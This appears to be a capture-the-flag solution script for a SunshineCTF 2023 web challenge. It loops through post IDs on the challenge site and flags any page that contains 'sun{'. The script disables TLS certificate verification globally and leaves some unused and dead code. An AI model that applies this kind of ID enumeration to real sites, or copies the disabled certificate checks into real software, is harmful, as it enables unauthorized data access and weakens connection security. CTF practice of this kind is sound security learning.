from urllib import request
import time
import urllib

import ssl

ssl._create_default_https_context = ssl._create_unverified_context
context = ssl._create_unverified_context()
for i in range(606,1000):
    if i < 10:
        url="https://beepboop.web.2023.sunshinectf.games/post/00"+str(i)+"/"
        header={
            "User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
                }
        response = request.urlopen(url)
        if "sun{" in response.read().decode('utf-8'):
            print(str(i)+"yes!")
        print(i)
    elif i>10 and i < 100:
        url="https://beepboop.web.2023.sunshinectf.games/post/0"+str(i)+"/"
        header={
            "User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
                }
        response = request.urlopen(url)
        if "sun{" in response.read().decode('utf-8'):
            print(str(i)+"yes!")
        print(i)
    elif i > 100 and i <1000:
        url="https://beepboop.web.2023.sunshinectf.games/post/"+str(i)+"/"
        header={
            "User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
                }
        response = request.urlopen(url)
        if "sun{" in response.read().decode('utf-8'):
            print(str(i)+"yes!")
        print(i)
# sess=requests.session()
# r=requests.get(url=url)

# response = urllib3.urlopen(request, context = context)
# retur_1=request.text
